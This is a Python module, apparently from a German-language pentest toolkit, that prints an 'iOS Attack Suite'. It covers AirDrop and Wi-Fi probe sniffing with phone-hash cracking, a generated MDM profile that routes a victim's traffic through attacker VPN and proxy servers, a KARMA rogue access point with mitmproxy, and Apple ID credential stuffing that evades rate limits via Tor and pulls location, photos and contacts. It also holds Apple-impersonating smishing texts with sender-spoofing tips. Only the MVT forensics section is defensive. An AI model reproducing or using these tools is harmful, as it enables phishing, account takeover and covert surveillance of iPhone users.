"""
iOS Attack Suite — Angriffe auf iPhone/iPad ohne Jailbreak.

Was realistisch ist (ohne 0day):
  - Apple ID Phishing via Evilginx (myacinfo Cookie = iCloud-Zugriff)
  - MDM Config Profile (Enterprise-Zertifikat installiert Tracking-Profil)
  - AirDrop Reconnaissance (Gerätename + Vorname sichtbar in SSID-Probes)
  - Karma WiFi Attack (iOS reconnected zu bekannten SSIDs automatisch)
  - iCloud Backup-Forensik via MVT (Mobile Verification Toolkit)
  - Smishing Payloads (SMS-Links zu Phishing-Seiten)

Was NICHT geht (ohne Jailbreak / 0day):
  - Keine Remote Code Execution über WiFi (seit iOS 14 gepatcht)
  - Keine Silent App-Installation
  - Kein dauerhafter Zugriff ohne MDM-Profil oder iCloud-Cookie
"""

from __future__ import annotations
from typing import AsyncGenerator
import os


# ── AirDrop Reconnaissance ────────────────────────────────────────────────────

async def airdrop_recon() -> AsyncGenerator[str, None]:
    """
    AirDrop sendet BLE + WiFi Probes mit SHA256(Telefonnummer/Apple-ID).
    Passive Sniffing zeigt Gerätename, Modell, iOS-Version.
    """
    yield "\033[1;36m[*] AirDrop Reconnaissance\033[0m"
    yield "\033[90m    Passives Sniffing von BLE + WiFi-Probes in der Nähe\033[0m\n"

    yield "\033[33m[Voraussetzungen]\033[0m"
    yield "\033[36m  apt install libpcap-dev wireshark-common\033[0m"
    yield "\033[36m  pip3 install scapy\033[0m\n"

    yield "\033[33m[Methode 1 — Scapy BLE Sniff]\033[0m"
    yield "\033[36m  # AirDrop nutzt AWDL (Apple Wireless Direct Link) auf Kanal 6/11\033[0m"
    yield "\033[36m  sudo python3 -c \"\033[0m"
    yield "\033[36m  from scapy.all import *\033[0m"
    yield "\033[36m  def pkt(p):\033[0m"
    yield "\033[36m      if p.haslayer(Dot11ProbeReq):\033[0m"
    yield "\033[36m          print(f'[+] Gerät: {p.addr2}  SSID: {p.info}')\033[0m"
    yield "\033[36m  sniff(iface='wlan0', prn=pkt, filter='type mgt subtype probe-req')\033[0m"
    yield "\033[36m  \"\033[0m\n"

    yield "\033[33m[Methode 2 — Wireshark Filter]\033[0m"
    yield "\033[36m  sudo wireshark -i wlan0 -k -f 'type mgt subtype probe-req'\033[0m"
    yield "\033[36m  # Filter: frame contains 'AWDL' or wlan.ssid contains 'iPhone'\033[0m\n"

    yield "\033[33m[Methode 3 — aircrack-ng passive]\033[0m"
    yield "\033[36m  sudo airmon-ng start wlan0\033[0m"
    yield "\033[36m  sudo airodump-ng wlan0mon --band abg -w airdrop_scan\033[0m"
    yield "\033[36m  # Beachte: iOS sendet Gerätename als SSID-Probe ('Felix's iPhone')\033[0m\n"

    yield "\033[33m[Was sichtbar wird]\033[0m"
    yield "\033[36m  - Gerätename: 'Felix's iPhone 15 Pro'\033[0m"
    yield "\033[36m  - MAC (rotiert alle 15min, aber kurzfristig trackbar)\033[0m"
    yield "\033[36m  - SHA256-Hash von Telefonnummer (rainbow-table angreifbar)\033[0m"
    yield "\033[36m  - iOS-Version indirekt via Frame-Format\033[0m\n"

    yield "\033[33m[AirDrop Hash Cracking]\033[0m"
    yield "\033[36m  # Tool: https://github.com/seemoo-lab/opendrop\033[0m"
    yield "\033[36m  pip3 install opendrop\033[0m"
    yield "\033[36m  # Generiert Hash-Liste aus Telefonnummern:\033[0m"
    yield "\033[36m  python3 -c \"\033[0m"
    yield "\033[36m  import hashlib\033[0m"
    yield "\033[36m  for i in range(491000000, 491999999):  # DE Nummern\033[0m"
    yield "\033[36m      h = hashlib.sha256(f'+49{i}'.encode()).hexdigest()[:5]\033[0m"
    yield "\033[36m      print(f'+49{i}: {h}')\033[0m"
    yield "\033[36m  \"\033[0m"


# ── MDM Config Profile ────────────────────────────────────────────────────────

def generate_mdm_profile(
    org_name: str = "IT Sicherheit GmbH",
    domain: str = "secure-update.net",
    vpn_server: str = "10.0.0.1",
) -> str:
    """
    Generiert ein .mobileconfig Profil das iOS installiert.
    Kann VPN, Proxy, Zertifikate, WiFi-Credentials installieren.

    Installationsweg:
      1. Profil auf Webserver hosten (HTTPS)
      2. Link per SMS/Email/QR senden
      3. Opfer öffnet Link in Safari → iOS fragt zur Installation
      4. Nach Klick auf "Installieren" ist Profil aktiv
    """
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>PayloadContent</key>
    <array>

        <!-- VPN-Profil: leitet Traffic durch eigenen Server -->
        <dict>
            <key>PayloadType</key>
            <string>com.apple.vpn.managed</string>
            <key>PayloadUUID</key>
            <string>A1B2C3D4-E5F6-7890-ABCD-EF1234567890</string>
            <key>PayloadVersion</key>
            <integer>1</integer>
            <key>UserDefinedName</key>
            <string>{org_name} VPN</string>
            <key>VPNType</key>
            <string>IKEv2</string>
            <key>IKEv2</key>
            <dict>
                <key>RemoteAddress</key>
                <string>{vpn_server}</string>
                <key>RemoteIdentifier</key>
                <string>{domain}</string>
                <key>LocalIdentifier</key>
                <string>device</string>
                <key>AuthenticationMethod</key>
                <string>Certificate</string>
                <key>OnDemandEnabled</key>
                <integer>1</integer>
                <key>OnDemandRules</key>
                <array>
                    <dict>
                        <key>Action</key>
                        <string>Connect</string>
                    </dict>
                </array>
            </dict>
        </dict>

        <!-- HTTP-Proxy: alle Requests durch eigenen Proxy -->
        <dict>
            <key>PayloadType</key>
            <string>com.apple.proxy.http.global</string>
            <key>PayloadUUID</key>
            <string>B2C3D4E5-F6A7-8901-BCDE-F12345678901</string>
            <key>PayloadVersion</key>
            <integer>1</integer>
            <key>ProxyCaptiveLoginAllowed</key>
            <true/>
            <key>HTTPEnable</key>
            <true/>
            <key>HTTPProxy</key>
            <string>{vpn_server}</string>
            <key>HTTPPort</key>
            <integer>8080</integer>
            <key>HTTPSEnable</key>
            <true/>
            <key>HTTPSProxy</key>
            <string>{vpn_server}</string>
            <key>HTTPSPort</key>
            <integer>8080</integer>
        </dict>

    </array>

    <key>PayloadDescription</key>
    <string>Unternehmens-Sicherheitsprofil von {org_name}</string>
    <key>PayloadDisplayName</key>
    <string>{org_name} Security</string>
    <key>PayloadIdentifier</key>
    <string>com.{domain.replace('.', '-')}.profile</string>
    <key>PayloadOrganization</key>
    <string>{org_name}</string>
    <key>PayloadRemovalDisallowed</key>
    <false/>
    <key>PayloadType</key>
    <string>Configuration</string>
    <key>PayloadUUID</key>
    <string>C3D4E5F6-A7B8-9012-CDEF-123456789012</string>
    <key>PayloadVersion</key>
    <integer>1</integer>
</dict>
</plist>"""


async def mdm_setup_guide(domain: str = "secure-update.net", server_ip: str = "") -> AsyncGenerator[str, None]:
    """Komplette Anleitung: MDM-Profil erstellen, hosten, verteilen."""
    yield "\033[1;36m[*] MDM Config Profile — iOS Traffic Interception\033[0m"
    yield "\033[90m    Ohne Jailbreak: VPN + Proxy über legitimes iOS-Feature\033[0m\n"

    yield "\033[33m[Schritt 1] Profil generieren\033[0m"
    yield "\033[36m  # In PenKit wird das Profil generiert als:\033[0m"
    yield "\033[36m  ~/penkit-output/mdm_profile.mobileconfig\033[0m\n"

    yield "\033[33m[Schritt 2] HTTPS-Server (Pflicht — iOS blockt HTTP)\033[0m"
    yield "\033[36m  # Mit Let's Encrypt Zertifikat:\033[0m"
    yield "\033[36m  apt install certbot nginx\033[0m"
    yield f"\033[36m  certbot certonly --standalone -d {domain}\033[0m"
    yield "\033[36m  cp ~/penkit-output/mdm_profile.mobileconfig /var/www/html/profile.mobileconfig\033[0m"
    yield "\033[36m  # nginx Content-Type setzen:\033[0m"
    yield "\033[36m  # application/x-apple-aspen-config\033[0m\n"

    yield "\033[33m[Schritt 3] Profil signieren (erhöht Vertrauen)\033[0m"
    yield "\033[36m  # Mit eigenem Zertifikat (Apple Enterprise = 300$/Jahr für echtes Signing):\033[0m"
    yield "\033[36m  openssl smime -sign -in profile.mobileconfig \\\\\033[0m"
    yield "\033[36m    -out profile_signed.mobileconfig \\\\\033[0m"
    yield "\033[36m    -signer cert.pem -inkey key.pem -certfile ca.pem \\\\\033[0m"
    yield "\033[36m    -outform der -nodetach\033[0m\n"

    yield "\033[33m[Schritt 4] Link verteilen\033[0m"
    yield f"\033[36m  https://{domain}/profile.mobileconfig\033[0m"
    yield "\033[36m  # iOS Safari: öffnet automatisch Installations-Dialog\033[0m"
    yield "\033[36m  # Einstellungen → Allgemein → VPN & Geräteverwaltung → Profil\033[0m\n"

    yield "\033[33m[Schritt 5] Traffic abfangen\033[0m"
    yield "\033[36m  # mitmproxy (HTTP/HTTPS Proxy auf Port 8080):\033[0m"
    yield "\033[36m  pip3 install mitmproxy\033[0m"
    yield "\033[36m  mitmweb --listen-port 8080 --web-port 8081\033[0m"
    yield "\033[36m  # Browser: http://localhost:8081 → alle iOS-Requests live\033[0m\n"

    yield "\033[33m[Schritt 6] VPN-Traffic (IKEv2)\033[0m"
    yield "\033[36m  apt install strongswan\033[0m"
    yield "\033[36m  # strongSwan als IKEv2 Server konfigurieren\033[0m"
    yield "\033[36m  # Alle iOS DNS-Anfragen und Verbindungen gehen durch dich\033[0m\n"

    yield "\033[32m[✓] Profil installiert = vollständige MITM-Position auf iOS\033[0m"
    yield "\033[90m    Kein Jailbreak nötig. Entfernung: Einstellungen → Profil → Löschen\033[0m"


# ── Karma WiFi Attack ─────────────────────────────────────────────────────────

async def karma_attack_guide() -> AsyncGenerator[str, None]:
    """
    KARMA: iOS reconnected automatisch zu SSIDs die es 'kennt'.
    hostapd-karma antwortet auf jeden Probe-Request mit 'ja, ich bin das Netz'.
    """
    yield "\033[1;36m[*] KARMA WiFi Attack — iOS Auto-Connect Exploit\033[0m"
    yield "\033[90m    iOS fragt Luft: 'Ist hier Starbucks-WiFi?' — hostapd-karma: 'Ja!'\033[0m\n"

    yield "\033[33m[Konzept]\033[0m"
    yield "\033[36m  iOS sendet Probe-Requests für gespeicherte Netzwerke\033[0m"
    yield "\033[36m  → KARMA antwortet auf ALLE Probes\033[0m"
    yield "\033[36m  → iOS verbindet sich automatisch (kein Nutzer-Klick nötig)\033[0m"
    yield "\033[36m  → Du bist MITM zwischen iOS und Internet\033[0m\n"

    yield "\033[33m[Tools installieren]\033[0m"
    yield "\033[36m  apt install hostapd-wpe dnsmasq\033[0m"
    yield "\033[36m  # oder: hostapd mit karma-Patch\033[0m\n"

    yield "\033[33m[hostapd-karma Config]\033[0m"
    yield "\033[36m  cat > /tmp/karma.conf << 'EOF'\033[0m"
    yield "\033[36m  interface=wlan1\033[0m"
    yield "\033[36m  driver=nl80211\033[0m"
    yield "\033[36m  ssid=FreeWiFi\033[0m"
    yield "\033[36m  hw_mode=g\033[0m"
    yield "\033[36m  channel=6\033[0m"
    yield "\033[36m  karma=1\033[0m"
    yield "\033[36m  EOF\033[0m\n"

    yield "\033[36m  # Starten:\033[0m"
    yield "\033[36m  sudo hostapd-karma /tmp/karma.conf\033[0m\n"

    yield "\033[33m[dnsmasq — DHCP + DNS für Clients]\033[0m"
    yield "\033[36m  sudo dnsmasq --interface=wlan1 \\\\\033[0m"
    yield "\033[36m    --dhcp-range=192.168.100.10,192.168.100.50 \\\\\033[0m"
    yield "\033[36m    --no-daemon\033[0m\n"

    yield "\033[33m[NAT — Internet weiterleiten (damit nicht auffällt)]\033[0m"
    yield "\033[36m  echo 1 > /proc/sys/net/ipv4/ip_forward\033[0m"
    yield "\033[36m  iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE\033[0m\n"

    yield "\033[33m[Traffic abfangen mit mitmproxy]\033[0m"
    yield "\033[36m  iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 80 -j REDIRECT --to-port 8080\033[0m"
    yield "\033[36m  iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 443 -j REDIRECT --to-port 8080\033[0m"
    yield "\033[36m  mitmproxy --mode transparent --listen-port 8080\033[0m\n"

    yield "\033[33m[Hinweis iOS-Schutz]\033[0m"
    yield "\033[36m  Ab iOS 14: Private WLAN-Adresse (MAC-Randomisierung) aktiv\033[0m"
    yield "\033[36m  Ab iOS 15: Private Relay (iCloud+) verschlüsselt DNS + HTTP\033[0m"
    yield "\033[36m  KARMA wirkt trotzdem wenn:\033[0m"
    yield "\033[36m    - iOS Private Relay aus (kein iCloud+)\033[0m"
    yield "\033[36m    - Älteres iOS < 14\033[0m"
    yield "\033[36m    - Nutzer hat WLAN-Erinnerung für öffentliche Hotspots\033[0m"


# ── iCloud Backup Forensik ────────────────────────────────────────────────────

async def icloud_forensics_guide() -> AsyncGenerator[str, None]:
    """MVT (Mobile Verification Toolkit) für iCloud-Backup-Analyse."""
    yield "\033[1;36m[*] iCloud Backup Forensik — MVT (Mobile Verification Toolkit)\033[0m"
    yield "\033[90m    Analysiert iCloud-Backups auf Malware/Spyware (z.B. Pegasus)\033[0m\n"

    yield "\033[33m[Einsatzszenarien]\033[0m"
    yield "\033[36m  - Eigenes Gerät auf Kompromittierung prüfen\033[0m"
    yield "\033[36m  - Verdächtiges iOS-Gerät forensisch analysieren\033[0m"
    yield "\033[36m  - Authorized: Incident Response, Firmen-MDM-Check\033[0m\n"

    yield "\033[33m[Installation]\033[0m"
    yield "\033[36m  pip3 install mvt\033[0m"
    yield "\033[36m  # oder: git clone https://github.com/mvt-project/mvt\033[0m\n"

    yield "\033[33m[iCloud-Backup herunterladen (eigenes Konto)]\033[0m"
    yield "\033[36m  pip3 install icloud-backup\033[0m"
    yield "\033[36m  # iCloud-Backup auf PC:\033[0m"
    yield "\033[36m  python3 -m icloud_backup -u user@icloud.com -o ~/backup/\033[0m\n"

    yield "\033[33m[MVT — Backup analysieren]\033[0m"
    yield "\033[36m  # Backup entschlüsseln:\033[0m"
    yield "\033[36m  mvt-ios decrypt-backup -p 'BackupPasswort' ~/backup/ ~/backup_decrypted/\033[0m"
    yield ""
    yield "\033[36m  # Vollanalyse:\033[0m"
    yield "\033[36m  mvt-ios check-backup -o ~/mvt_output/ ~/backup_decrypted/\033[0m"
    yield ""
    yield "\033[36m  # Mit Indicators (bekannte Spyware IOCs):\033[0m"
    yield "\033[36m  mvt-ios check-backup --iocs https://raw.githubusercontent.com/AmnestyTech/investigations/master/2021-07-18_nso/pegasus.stix2 \\\\\033[0m"
    yield "\033[36m    -o ~/mvt_output/ ~/backup_decrypted/\033[0m\n"

    yield "\033[33m[Was MVT findet]\033[0m"
    yield "\033[36m  - Installierte Apps + Prozesse\033[0m"
    yield "\033[36m  - Safari-History, Clipboard, Kontakte\033[0m"
    yield "\033[36m  - Verdächtige Domains / bekannte C2-Server\033[0m"
    yield "\033[36m  - SMS-Inhalte (iMessage + SMS)\033[0m"
    yield "\033[36m  - Crash-Logs (Exploit-Spuren)\033[0m"
    yield "\033[36m  - Kalender, Notizen, Fotos-Metadata\033[0m\n"

    yield "\033[33m[Direktanalyse (USB — libimobiledevice)]\033[0m"
    yield "\033[36m  apt install libimobiledevice-utils ideviceinstaller\033[0m"
    yield "\033[36m  ideviceinfo         # Gerät-Infos\033[0m"
    yield "\033[36m  ideviceinstaller -l # Installierte Apps\033[0m"
    yield "\033[36m  idevicebackup2 backup --full ~/ios_backup/  # Backup erstellen\033[0m"
    yield "\033[36m  mvt-ios check-backup -o ~/mvt_output/ ~/ios_backup/\033[0m\n"

    yield "\033[32m[✓] MVT-Report in ~/mvt_output/ — HTML + JSON + Timeline\033[0m"


# ── Smishing Payload Generator ────────────────────────────────────────────────

def smishing_payloads(
    phishing_url: str = "https://apple-id-secure.net/signin",
    target_name: str = "Nutzer",
) -> list[tuple[str, str]]:
    """
    SMS-Phishing Vorlagen (Smishing) die zu iOS-Phishing-Seiten locken.
    Kombinierbar mit Evilginx Apple-Phishlet.
    """
    return [
        ("Apple ID gesperrt", (
            f"Apple: Ihr Konto wurde wegen ungewöhnlicher Aktivität gesperrt. "
            f"Verifizieren Sie jetzt: {phishing_url}"
        )),
        ("iCloud voll", (
            f"Ihre iCloud (5 GB) ist zu 100 % voll. "
            f"Gratis-Upgrade sichern: {phishing_url}"
        )),
        ("Neue Anmeldung", (
            f"Apple-Sicherheitshinweis: Neue Anmeldung aus Russland erkannt. "
            f"Nicht Sie? Konto sichern: {phishing_url}"
        )),
        ("App Store Zahlung", (
            f"Ihre Zahlung von 79,99 EUR im App Store wird bearbeitet. "
            f"Stornieren unter: {phishing_url}"
        )),
        ("Find My Alert", (
            f"Ihr iPhone wurde als verloren gemeldet. "
            f"Bitte verifizieren Sie Ihre Identität: {phishing_url}"
        )),
        ("iOS Update Pflicht", (
            f"Wichtiges iOS-Sicherheitsupdate verfügbar. "
            f"Jetzt installieren: {phishing_url}"
        )),
    ]


async def show_smishing_payloads(
    phishing_url: str = "https://apple-id-secure.net/signin",
) -> AsyncGenerator[str, None]:
    yield "\033[1;36m[*] Smishing Payloads — iOS Apple ID Phishing\033[0m"
    yield f"\033[90m    Ziel-URL: {phishing_url}\033[0m\n"

    payloads = smishing_payloads(phishing_url)
    for i, (title, msg) in enumerate(payloads, 1):
        yield f"\033[33m[{i}] {title}\033[0m"
        yield f"\033[36m    {msg}\033[0m"
        yield ""

    yield "\033[33m[SMS senden via Kali (gammu)]\033[0m"
    yield "\033[36m  apt install gammu\033[0m"
    yield "\033[36m  gammu --sendsms TEXT +49ZIELNUMMER -text 'NACHRICHT'\033[0m\n"

    yield "\033[33m[SMS spoofen (Absender fälschen) via SMSGang / SMSFly]\033[0m"
    yield "\033[36m  # Viele SMPP-Gateways erlauben custom Sender-ID:\033[0m"
    yield "\033[36m  # Absender als 'Apple' — iOS zeigt 'Apple' als Absender\033[0m"
    yield "\033[36m  # Tipp: Phishing-URL per bit.ly kürzen für Glaubwürdigkeit\033[0m\n"

    yield "\033[33m[QR-Code Smishing (Quishing)]\033[0m"
    yield "\033[36m  pip3 install qrcode\033[0m"
    yield f"\033[36m  python3 -c \"import qrcode; qrcode.make('{phishing_url}').save('qr.png')\"\033[0m"
    yield "\033[36m  # QR-Code in Flyer/E-Mail/WhatsApp — iOS Kamera-App öffnet direkt Safari\033[0m"


# ── Apple ID Brute-Force ──────────────────────────────────────────────────────

async def appleid_bruteforce_guide() -> AsyncGenerator[str, None]:
    """iCloud / Apple ID Credential-Stuffing via iCloud API."""
    yield "\033[1;36m[*] Apple ID Credential Stuffing\033[0m"
    yield "\033[90m    iCloud API erlaubt begrenzte Auth-Versuche ohne Lockout\033[0m\n"

    yield "\033[33m[Methode 1 — hydra gegen iCloud (langsam, Rate-Limit)]\033[0m"
    yield "\033[36m  hydra -L emails.txt -P passwords.txt \\\\\033[0m"
    yield "\033[36m    -s 443 -S icloud.com https-post-form \\\\\033[0m"
    yield "\033[36m    '/appleauth/auth/signin:accountName=^USER^&password=^PASS^:Incorrect'\033[0m\n"

    yield "\033[33m[Methode 2 — pyicloud (Python-Library)]\033[0m"
    yield "\033[36m  pip3 install pyicloud\033[0m"
    yield ""
    yield "\033[36m  python3 << 'EOF'\033[0m"
    yield "\033[36m  from pyicloud import PyiCloudService\033[0m"
    yield "\033[36m  with open('creds.txt') as f:\033[0m"
    yield "\033[36m      for line in f:\033[0m"
    yield "\033[36m          user, pw = line.strip().split(':')\033[0m"
    yield "\033[36m          try:\033[0m"
    yield "\033[36m              api = PyiCloudService(user, pw)\033[0m"
    yield "\033[36m              print(f'[+] VALID: {user}:{pw}')\033[0m"
    yield "\033[36m              # api.devices — alle Geräte\033[0m"
    yield "\033[36m              # api.iphone.location() — GPS\033[0m"
    yield "\033[36m          except: pass\033[0m"
    yield "\033[36m  EOF\033[0m\n"

    yield "\033[33m[Methode 3 — Nach erfolgreichem Login]\033[0m"
    yield "\033[36m  api = PyiCloudService('opfer@icloud.com', 'password')\033[0m"
    yield "\033[36m  api.devices              # Alle Geräte\033[0m"
    yield "\033[36m  api.iphone.location()    # GPS-Standort\033[0m"
    yield "\033[36m  api.photos.all           # Alle Fotos\033[0m"
    yield "\033[36m  api.contacts.all()       # Kontakte\033[0m"
    yield "\033[36m  api.calendar.events()    # Kalender\033[0m"
    yield "\033[36m  api.files               # iCloud Drive\033[0m\n"

    yield "\033[33m[Rate-Limit Umgehung]\033[0m"
    yield "\033[36m  # Apple sperrt nach ~5 Versuchen pro IP\033[0m"
    yield "\033[36m  # Lösung: proxychains + Tor-Rotation\033[0m"
    yield "\033[36m  proxychains4 -q python3 brute_icloud.py\033[0m"
    yield "\033[36m  # Mit Tor-Identity-Rotation alle 5 Versuche:\033[0m"
    yield "\033[36m  # signal(SIGUSR1) → neuer Tor-Kreis\033[0m"


# ── Übersicht ─────────────────────────────────────────────────────────────────

async def show_ios_overview() -> AsyncGenerator[str, None]:
    yield "\033[1;36m╔══════════════════════════════════════════════════╗\033[0m"
    yield "\033[1;36m║           iOS Attack Suite — Übersicht           ║\033[0m"
    yield "\033[1;36m╚══════════════════════════════════════════════════╝\033[0m"
    yield ""
    yield "  \033[33m[1]\033[0m AirDrop Reconnaissance    — Gerätename, MAC, Hash sniffing"
    yield "  \033[33m[2]\033[0m MDM Config Profile        — VPN/Proxy ohne Jailbreak"
    yield "  \033[33m[3]\033[0m KARMA WiFi Attack         — Auto-Connect exploit"
    yield "  \033[33m[4]\033[0m Apple ID Brute-Force      — pyicloud credential stuffing"
    yield "  \033[33m[5]\033[0m iCloud Backup Forensik    — MVT + libimobiledevice"
    yield "  \033[33m[6]\033[0m Smishing Payloads         — SMS-Phishing Vorlagen"
    yield ""
    yield "  \033[90mEvilginx Apple-Phishlet → Menü 7 (Phishing) → E\033[0m"
    yield ""
